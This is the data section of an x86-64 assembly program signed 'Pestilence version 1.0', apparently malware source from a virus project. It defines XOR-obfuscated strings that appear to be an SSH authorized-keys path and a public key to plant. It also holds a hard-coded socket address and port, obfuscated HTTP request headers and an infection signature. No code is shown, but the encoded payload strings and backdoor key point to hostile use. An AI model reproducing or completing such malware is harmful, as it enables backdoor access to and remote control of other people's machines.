sshFile db 0x46, 0x57, 0x18, 0x09, 0x04, 0x1D, 0x69, 0x20, 0x04, 0x5A, 0x09, 0x1C, 0x1C, 0x51, 0x1F, 0x09, 0x02, 0x5B, 0x3D, 0x36, 0x13, 0x6D, 0x4D, 0x18, 0x10, 0x56, 0x77
sshFile_len equ $ - sshFile
sshPub db 0x1A, 0x56, 0x1F, 0x4B, 0x15, 0x56, 0x75, 0x66, 0x42, 0x03, 0x1E, 0x5D, 0x28, 0x64, 0x36, 0x27, 0x33, 0x01, 0x09, 0x29, 0x16, 0x71, 0x17, 0x11, 0x33, 0x61, 0x3E, 0x57, 0x3E, 0x66, 0x02, 0x66, 0x36, 0x73, 0x67, 0x3C, 0x20, 0x6E, 0x14, 0x15, 0x34, 0x50, 0x2E, 0x29, 0x16, 0x01, 0x72, 0x0E, 0x5F, 0x67, 0x4E, 0x32, 0x00, 0x51, 0x22, 0x3B, 0x0F, 0x58, 0x7F, 0x45, 0x19, 0x46, 0x27, 0x0F, 0x1A, 0x5C, 0x03, 0x2B, 0x35, 0x42, 0x53, 0x14, 0x2C, 0x4E, 0x18, 0x12, 0x22, 0x71, 0x29, 0x63, 0x57, 0x55, 0x49, 0x09, 0x1D, 0x4C, 0x12, 0x26, 0x14, 0x57, 0x25, 0x3A, 0x16, 0x5C, 0x26
sshPubLen equ $ - sshPub
sockaddr:
dw 1 
dw 0x401E 
dd 0x100007E 
dq -1 ; padding
sockaddrLen equ $ - sockaddr
headerStart db 0x39, 0x6A, 0x24, 0x32, 0x50, 0x1D, 0x22, 0x2B, 0x03, 0x40, 0x47, 0x1E, 0x1D, 0x05, 0x3F, 0x32, 0x24, 0x62, 0x68, 0x63, 0x59, 0x03, 0x7A, 0x0F, 0x35, 0x4B, 0x3F, 0x09, 0x03, 0x46, 0x7D, 0x73, 0x46, 0x00, 0x10, 0x53, 0x59, 0x0B, 0x47, 0x48, 0x41, 0x08, 0x7F, 0x63, 0x47, 0x02, 0x7A, 0x0F, 0x35, 0x4B, 0x34, 0x09, 0x1E, 0x46, 0x22, 0x3D, 0x03, 0x1F, 0x72, 0x04, 0x19, 0x40, 0x4D, 0x46, 0x04, 0x57, 0x3F, 0x27, 0x58, 0x42, 0x4A, 0x1C, 0x00, 0x4B, 0x2B, 0x00, 0x2C, 0x5C, 0x04, 0x3C, 0x19, 0x46, 0x43, 0x13, 0x1D, 0x08, 0x3B, 0x03, 0x1E, 0x55, 0x33, 0x3B, 0x4D, 0x12, 0x26
headerStartLen equ $ - headerStart
headerEnd db 12, 10, 13, 10, 0 
headerEndLen equ $ - headerEnd
headerGet db 0x2E, 0x60, 0x23, 0x46, 0x5F, 0x5B, 0x29, 0x35, 0x12, 0x51, 0x52, 0x14, 0x06, 0x4B, 0x57, 0x2E, 0x24, 0x66, 0x17, 0x7C, 0x47, 0x1C, 0x17, 0x21, 0x1B, 0x79, 0x19, 0x2E, 0x1F, 0x41, 0x33, 0x69, 0x57, 0x03, 0x14, 0x4B, 0x47, 0x15, 0x59, 0x56, 0x5E, 0x03, 0x7D, 0x6B, 0x47, 0x02, 0x16, 0x7D, 13, 10, 12, 10
headerGetLen equ $ - headerGet
timespec:
dq -1 ; Secondes
dq 9999999 
signature db "Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0 
signature_len equ $ - signature
_end: 